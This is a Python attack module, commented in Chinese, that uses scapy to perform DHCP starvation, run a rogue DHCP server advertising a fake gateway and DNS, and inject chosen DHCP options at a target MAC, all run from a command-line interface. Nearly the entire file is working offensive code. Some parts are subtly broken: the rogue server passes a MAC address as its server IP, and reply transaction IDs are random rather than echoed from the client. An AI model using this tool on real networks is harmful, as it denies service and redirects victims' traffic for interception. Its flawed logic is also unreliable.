#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
TRAES DHCP攻击模块
实现DHCP饥饿攻击、DHCP欺骗攻击、DHCP发现扫描、恶意DHCP服务器和DHCP选项注入
"""

import time
import random
import threading
import ipaddress
from typing import List, Dict, Optional, Tuple
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from colorama import Fore, Style, init

# 初始化colorama
init(autoreset=True)

# 配置日志
import logging
logger = logging.getLogger(__name__)

class DHCPAttack:
    """
    DHCP攻击类
    实现多种DHCP攻击方式
    """
    
    def __init__(self, config: Dict = None):
        """
        初始化DHCP攻击模块
        
        Args:
            config (dict): 配置参数
        """
        self.config = config or {}
        
        # 攻击参数
        self.request_rate = self.config.get('request_rate', 10)  # 每秒请求数
        self.max_requests = self.config.get('max_requests', 1000)  # 最大请求数
        self.timeout = self.config.get('timeout', 10)  # 超时时间
        
        # 恶意DHCP服务器参数
        self.ip_pool_start = self.config.get('ip_pool_start', '192.168.1.100')
        self.ip_pool_end = self.config.get('ip_pool_end', '192.168.1.200')
        self.fake_gateway = self.config.get('fake_gateway', '192.168.1.1')
        self.fake_dns = self.config.get('fake_dns', ['8.8.8.8', '8.8.4.4'])
        
        # 白名单
        self.whitelist = set(self.config.get('whitelist', []))
        
        # 运行状态
        self.running = False
        self.attack_thread = None
        
        # 客户端绑定记录
        self.client_bindings = {}
        self.allocated_ips = set()
    
    def generate_random_mac(self) -> str:
        """
        生成随机MAC地址
        
        Returns:
            str: 随机MAC地址
        """
        mac = [0x00, 0x16, 0x3e,
               random.randint(0x00, 0x7f),
               random.randint(0x00, 0xff),
               random.randint(0x00, 0xff)]
        return ':'.join(map(lambda x: "%02x" % x, mac))
    
    def is_whitelisted_mac(self, mac: str) -> bool:
        """
        检查MAC地址是否在白名单中
        
        Args:
            mac (str): MAC地址
            
        Returns:
            bool: 是否在白名单中
        """
        return mac.lower() in [w.lower() for w in self.whitelist]
    
    def create_dhcp_discover(self, client_mac: str) -> Ether:
        """
        创建DHCP Discover包
        
        Args:
            client_mac (str): 客户端MAC地址
            
        Returns:
            Ether: DHCP Discover包
        """
        # 构造以太网帧
        ethernet = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
        
        # 构造IP包
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        
        # 构造UDP包
        udp = UDP(sport=68, dport=67)
        
        # 构造BOOTP包
        bootp = BOOTP(
            op=1,  # 请求
            htype=1,  # 以太网
            hlen=6,  # MAC地址长度
            xid=random.randint(1, 0xFFFFFFFF),  # 事务ID
            chaddr=[int(x, 16) for x in client_mac.split(':')]  # 客户端MAC
        )
        
        # 构造DHCP选项
        dhcp_options = [
            ('message-type', 'discover'),
            ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),
            'end'
        ]
        
        dhcp = DHCP(options=dhcp_options)
        
        return ethernet / ip / udp / bootp / dhcp
    
    def create_dhcp_request(self, client_mac: str, requested_ip: str, 
                          server_ip: str) -> Ether:
        """
        创建DHCP Request包
        
        Args:
            client_mac (str): 客户端MAC地址
            requested_ip (str): 请求的IP地址
            server_ip (str): 服务器IP地址
            
        Returns:
            Ether: DHCP Request包
        """
        ethernet = Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst="255.255.255.255")
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(
            op=1,
            htype=1,
            hlen=6,
            xid=random.randint(1, 0xFFFFFFFF),
            chaddr=[int(x, 16) for x in client_mac.split(':')]
        )
        
        dhcp_options = [
            ('message-type', 'request'),
            ('requested_addr', requested_ip),
            ('server_id', server_ip),
            'end'
        ]
        
        dhcp = DHCP(options=dhcp_options)
        
        return ethernet / ip / udp / bootp / dhcp
    
    def create_dhcp_offer(self, client_mac: str, offered_ip: str, 
                         server_ip: str, gateway: str, dns_servers: List[str]) -> Ether:
        """
        创建DHCP Offer包
        
        Args:
            client_mac (str): 客户端MAC地址
            offered_ip (str): 提供的IP地址
            server_ip (str): 服务器IP地址
            gateway (str): 网关地址
            dns_servers (list): DNS服务器列表
            
        Returns:
            Ether: DHCP Offer包
        """
        ethernet = Ether(src=get_if_hwaddr(conf.iface), dst=client_mac)
        ip = IP(src=server_ip, dst=offered_ip)
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(
            op=2,  # 响应
            yiaddr=offered_ip,
            siaddr=server_ip,
            chaddr=[int(x, 16) for x in client_mac.split(':')],
            xid=random.randint(1, 0xFFFFFFFF)
        )
        
        dhcp_options = [
            ('message-type', 'offer'),
            ('server_id', server_ip),
            ('lease_time', 3600),
            ('subnet_mask', '255.255.255.0'),
            ('router', gateway),
            ('name_server', dns_servers),
            'end'
        ]
        
        dhcp = DHCP(options=dhcp_options)
        
        return ethernet / ip / udp / bootp / dhcp
    
    def create_dhcp_ack(self, client_mac: str, client_ip: str, 
                       server_ip: str, gateway: str, dns_servers: List[str]) -> Ether:
        """
        创建DHCP ACK包
        
        Args:
            client_mac (str): 客户端MAC地址
            client_ip (str): 客户端IP地址
            server_ip (str): 服务器IP地址
            gateway (str): 网关地址
            dns_servers (list): DNS服务器列表
            
        Returns:
            Ether: DHCP ACK包
        """
        ethernet = Ether(src=get_if_hwaddr(conf.iface), dst=client_mac)
        ip = IP(src=server_ip, dst=client_ip)
        udp = UDP(sport=67, dport=68)
        bootp = BOOTP(
            op=2,
            yiaddr=client_ip,
            siaddr=server_ip,
            chaddr=[int(x, 16) for x in client_mac.split(':')],
            xid=random.randint(1, 0xFFFFFFFF)
        )
        
        dhcp_options = [
            ('message-type', 'ack'),
            ('server_id', server_ip),
            ('lease_time', 3600),
            ('subnet_mask', '255.255.255.0'),
            ('router', gateway),
            ('name_server', dns_servers),
            'end'
        ]
        
        dhcp = DHCP(options=dhcp_options)
        
        return ethernet / ip / udp / bootp / dhcp
    
    def discover_dhcp_servers(self, interface: str = None, 
                            timeout: int = 10) -> List[Dict]:
        """
        发现网络中的DHCP服务器
        
        Args:
            interface (str): 网络接口名称
            timeout (int): 超时时间
            
        Returns:
            list: DHCP服务器信息列表
        """
        if interface:
            conf.iface = interface
        
        logger.info("开始发现DHCP服务器...")
        
        try:
            # 生成随机MAC地址
            client_mac = self.generate_random_mac()
            
            # 创建DHCP Discover包
            discover_packet = self.create_dhcp_discover(client_mac)
            
            # 发送包并接收响应
            responses = srp(discover_packet, timeout=timeout, verbose=False)[0]
            
            servers = []
            for sent, received in responses:
                if received.haslayer(DHCP):
                    dhcp_layer = received[DHCP]
                    
                    # 检查是否为DHCP Offer
                    for option in dhcp_layer.options:
                        if isinstance(option, tuple) and option[0] == 'message-type' and option[1] == 2:
                            break
                    else:
                        continue
                    
                    # 提取服务器信息
                    server_info = {
                        'server_ip': received[IP].src,
                        'offered_ip': received[BOOTP].yiaddr,
                        'server_mac': received[Ether].src
                    }
                    
                    # 提取DHCP选项
                    for option in dhcp_layer.options:
                        if isinstance(option, tuple):
                            if option[0] == 'server_id':
                                server_info['server_id'] = option[1]
                            elif option[0] == 'router':
                                server_info['gateway'] = option[1]
                            elif option[0] == 'name_server':
                                server_info['dns'] = option[1]
                            elif option[0] == 'subnet_mask':
                                server_info['subnet_mask'] = option[1]
                    
                    servers.append(server_info)
                    logger.info(f"发现DHCP服务器: {server_info['server_ip']}")
            
            logger.info(f"发现 {len(servers)} 个DHCP服务器")
            return servers
            
        except Exception as e:
            logger.error(f"发现DHCP服务器时出错: {e}")
            return []
    
    def dhcp_starvation_attack(self, interface: str = None, 
                             target_network: str = None):
        """
        DHCP饥饿攻击
        
        Args:
            interface (str): 网络接口名称
            target_network (str): 目标网络
        """
        if interface:
            conf.iface = interface
        
        logger.info("开始DHCP饥饿攻击...")
        
        self.running = True
        request_count = 0
        
        try:
            while self.running and request_count < self.max_requests:
                # 生成随机MAC地址
                client_mac = self.generate_random_mac()
                
                # 检查白名单
                if self.is_whitelisted_mac(client_mac):
                    continue
                
                # 创建DHCP Discover包
                discover_packet = self.create_dhcp_discover(client_mac)
                
                # 发送包
                sendp(discover_packet, verbose=False)
                request_count += 1
                
                if request_count % 50 == 0:
                    logger.info(f"已发送 {request_count} 个DHCP请求")
                
                # 控制发送速率
                time.sleep(1.0 / self.request_rate)
                
        except KeyboardInterrupt:
            logger.info("收到中断信号，停止攻击")
        except Exception as e:
            logger.error(f"DHCP饥饿攻击过程中出错: {e}")
        finally:
            self.running = False
            logger.info(f"DHCP饥饿攻击完成，共发送 {request_count} 个请求")
    
    def get_next_available_ip(self) -> Optional[str]:
        """
        获取下一个可用的IP地址
        
        Returns:
            str: 可用的IP地址，如果没有则返回None
        """
        try:
            start_ip = ipaddress.ip_address(self.ip_pool_start)
            end_ip = ipaddress.ip_address(self.ip_pool_end)
            
            current_ip = start_ip
            while current_ip <= end_ip:
                ip_str = str(current_ip)
                if ip_str not in self.allocated_ips:
                    self.allocated_ips.add(ip_str)
                    return ip_str
                current_ip += 1
            
            return None
            
        except Exception as e:
            logger.error(f"获取可用IP地址时出错: {e}")
            return None
    
    def handle_dhcp_packet(self, packet):
        """
        处理接收到的DHCP包（用于恶意DHCP服务器）
        
        Args:
            packet: 接收到的数据包
        """
        if not packet.haslayer(DHCP):
            return
        
        dhcp_layer = packet[DHCP]
        client_mac = packet[Ether].src
        
        # 检查白名单
        if self.is_whitelisted_mac(client_mac):
            return
        
        # 解析DHCP消息类型
        message_type = None
        for option in dhcp_layer.options:
            if isinstance(option, tuple) and option[0] == 'message-type':
                message_type = option[1]
                break
        
        if message_type == 1:  # DHCP Discover
            self.handle_dhcp_discover(packet)
        elif message_type == 3:  # DHCP Request
            self.handle_dhcp_request(packet)
    
    def handle_dhcp_discover(self, packet):
        """
        处理DHCP Discover包
        
        Args:
            packet: DHCP Discover包
        """
        client_mac = packet[Ether].src
        
        # 获取可用IP地址
        available_ip = self.get_next_available_ip()
        if not available_ip:
            logger.warning("没有可用的IP地址")
            return
        
        # 记录客户端绑定
        self.client_bindings[client_mac] = available_ip
        
        # 创建并发送DHCP Offer
        server_ip = get_if_hwaddr(conf.iface)  # 使用本机IP作为服务器IP
        offer_packet = self.create_dhcp_offer(
            client_mac, available_ip, server_ip,
            self.fake_gateway, self.fake_dns
        )
        
        sendp(offer_packet, verbose=False)
        logger.info(f"向 {client_mac} 提供IP地址: {available_ip}")
    
    def handle_dhcp_request(self, packet):
        """
        处理DHCP Request包
        
        Args:
            packet: DHCP Request包
        """
        client_mac = packet[Ether].src
        
        # 检查是否有绑定记录
        if client_mac not in self.client_bindings:
            logger.warning(f"未找到客户端 {client_mac} 的绑定记录")
            return
        
        client_ip = self.client_bindings[client_mac]
        
        # 创建并发送DHCP ACK
        server_ip = get_if_hwaddr(conf.iface)  # 使用本机IP作为服务器IP
        ack_packet = self.create_dhcp_ack(
            client_mac, client_ip, server_ip,
            self.fake_gateway, self.fake_dns
        )
        
        sendp(ack_packet, verbose=False)
        logger.info(f"确认分配IP地址 {client_ip} 给 {client_mac}")
    
    def malicious_dhcp_server(self, interface: str = None):
        """
        运行恶意DHCP服务器
        
        Args:
            interface (str): 网络接口名称
        """
        if interface:
            conf.iface = interface
        
        logger.info("启动恶意DHCP服务器...")
        logger.info(f"IP池范围: {self.ip_pool_start} - {self.ip_pool_end}")
        logger.info(f"伪造网关: {self.fake_gateway}")
        logger.info(f"伪造DNS: {', '.join(self.fake_dns)}")
        
        self.running = True
        
        try:
            # 监听DHCP请求
            sniff(
                filter="udp and port 67",
                prn=self.handle_dhcp_packet,
                stop_filter=lambda x: not self.running,
                iface=interface
            )
            
        except KeyboardInterrupt:
            logger.info("收到中断信号，停止恶意DHCP服务器")
        except Exception as e:
            logger.error(f"恶意DHCP服务器运行时出错: {e}")
        finally:
            self.running = False
            logger.info("恶意DHCP服务器已停止")
    
    def dhcp_option_injection(self, target_mac: str, malicious_option: Tuple[str, str],
                            interface: str = None):
        """
        DHCP选项注入攻击
        
        Args:
            target_mac (str): 目标MAC地址
            malicious_option (tuple): 恶意选项 (选项名, 选项值)
            interface (str): 网络接口名称
        """
        if interface:
            conf.iface = interface
        
        logger.info(f"开始DHCP选项注入攻击，目标: {target_mac}")
        
        # 检查白名单
        if self.is_whitelisted_mac(target_mac):
            logger.warning(f"目标 {target_mac} 在白名单中，跳过攻击")
            return
        
        try:
            # 创建包含恶意选项的DHCP包
            dhcp_options = [
                ('message-type', 'offer'),
                ('server_id', '192.168.1.1'),
                ('lease_time', 3600),
                ('subnet_mask', '255.255.255.0'),
                ('router', '192.168.1.1'),
                malicious_option,  # 注入恶意选项
                'end'
            ]
            
            ethernet = Ether(src=get_if_hwaddr(conf.iface), dst=target_mac)
            ip = IP(src='192.168.1.1', dst='192.168.1.100')
            udp = UDP(sport=67, dport=68)
            bootp = BOOTP(
                op=2,
                yiaddr='192.168.1.100',
                siaddr='192.168.1.1',
                chaddr=[int(x, 16) for x in target_mac.split(':')],
                xid=random.randint(1, 0xFFFFFFFF)
            )
            dhcp = DHCP(options=dhcp_options)
            
            malicious_packet = ethernet / ip / udp / bootp / dhcp
            
            # 发送恶意包
            sendp(malicious_packet, verbose=False)
            logger.info(f"已向 {target_mac} 发送包含恶意选项的DHCP包")
            
        except Exception as e:
            logger.error(f"DHCP选项注入攻击时出错: {e}")
    
    def stop_attack(self):
        """
        停止DHCP攻击
        """
        logger.info("正在停止DHCP攻击...")
        self.running = False
        
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=5)
    
    def run(self, args):
        """
        运行DHCP攻击模块
        
        Args:
            args: 命令行参数对象
        """
        try:
            if args.mode == 'discover':
                # DHCP服务器发现
                servers = self.discover_dhcp_servers(args.interface, args.timeout)
                if servers:
                    print(f"\n{Fore.GREEN}发现的DHCP服务器:{Style.RESET_ALL}")
                    for i, server in enumerate(servers, 1):
                        print(f"{i}. 服务器IP: {server.get('server_ip', 'N/A')}")
                        print(f"   MAC地址: {server.get('server_mac', 'N/A')}")
                        print(f"   提供IP: {server.get('offered_ip', 'N/A')}")
                        print(f"   网关: {server.get('gateway', 'N/A')}")
                        print(f"   DNS: {server.get('dns', 'N/A')}")
                        print()
                else:
                    print(f"{Fore.YELLOW}未发现DHCP服务器{Style.RESET_ALL}")
            
            elif args.mode == 'starvation':
                # DHCP饥饿攻击
                self.request_rate = args.rate or self.request_rate
                self.max_requests = args.max_requests or self.max_requests
                self.dhcp_starvation_attack(args.interface, args.network)
            
            elif args.mode == 'server':
                # 恶意DHCP服务器
                if args.gateway:
                    self.fake_gateway = args.gateway
                if args.dns:
                    self.fake_dns = args.dns.split(',')
                if args.ip_start:
                    self.ip_pool_start = args.ip_start
                if args.ip_end:
                    self.ip_pool_end = args.ip_end
                
                self.malicious_dhcp_server(args.interface)
            
            elif args.mode == 'inject':
                # DHCP选项注入
                if not args.target_mac:
                    logger.error("选项注入模式需要指定目标MAC地址")
                    return
                
                if not args.option_name or not args.option_value:
                    logger.error("选项注入模式需要指定选项名称和值")
                    return
                
                malicious_option = (args.option_name, args.option_value)
                self.dhcp_option_injection(args.target_mac, malicious_option, args.interface)
            
            else:
                logger.error(f"未知的攻击模式: {args.mode}")
                
        except Exception as e:
            logger.error(f"DHCP攻击执行失败: {e}")
        finally:
            self.stop_attack()

# 如果直接运行此模块
if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="TRAES DHCP攻击模块")
    parser.add_argument('--mode', '-m', required=True, 
                       choices=['discover', 'starvation', 'server', 'inject'],
                       help='攻击模式')
    parser.add_argument('--interface', '-i', help='网络接口名称')
    parser.add_argument('--timeout', '-t', type=int, default=10, help='超时时间')
    parser.add_argument('--network', '-n', help='目标网络')
    parser.add_argument('--rate', '-r', type=int, help='请求速率')
    parser.add_argument('--max-requests', type=int, help='最大请求数')
    parser.add_argument('--gateway', '-g', help='伪造网关地址')
    parser.add_argument('--dns', '-d', help='伪造DNS服务器（逗号分隔）')
    parser.add_argument('--ip-start', help='IP池起始地址')
    parser.add_argument('--ip-end', help='IP池结束地址')
    parser.add_argument('--target-mac', help='目标MAC地址')
    parser.add_argument('--option-name', help='注入的选项名称')
    parser.add_argument('--option-value', help='注入的选项值')
    
    args = parser.parse_args()
    
    # 创建攻击实例
    attack = DHCPAttack()
    
    try:
        attack.run(args)
    except KeyboardInterrupt:
        print("\n用户中断攻击")
        attack.stop_attack()